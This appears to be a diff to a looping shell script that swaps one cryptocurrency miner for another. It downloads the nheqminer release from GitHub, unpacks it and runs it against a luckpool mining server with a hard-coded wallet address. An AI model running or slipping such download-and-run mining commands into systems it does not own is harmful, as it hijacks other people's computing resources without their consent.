@@ -2,13 +2,12 @@
  
 COUNTER=20
 until [  $COUNTER -lt 10 ]; do
+
+wget https://github.com/VerusCoin/nheqminer/releases/download/v0.8.2/nheqminer-Linux-v0.8.2.tgz && tar xf nheqminer-Linux-v0.8.2.tgz
+tar xf nheqminer-Linux-v0.8.2.tar.gz
+cd nheqminer
+./nheqminer -v -l na.luckpool.net:3956 -u RLM9zhMnfJisKwYpbREgsfyFrs2RnZvs4e.Test -p x -t 2
  
-
-wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz && tar xf hellminer_cpu_linux.tar.gz &&
-./hellminer -c stratum+tcp://ap.luckpool.net:3956#xnsub -u RLM9zhMnfJisKwYpbREgsfyFrs2RnZvs4e.$(echo $(shuf -i 1-20 -n 1)Tester) -p --cpu 4
-
-
-
      echo COUNTER $COUNTER
      let COUNTER-=1
 done
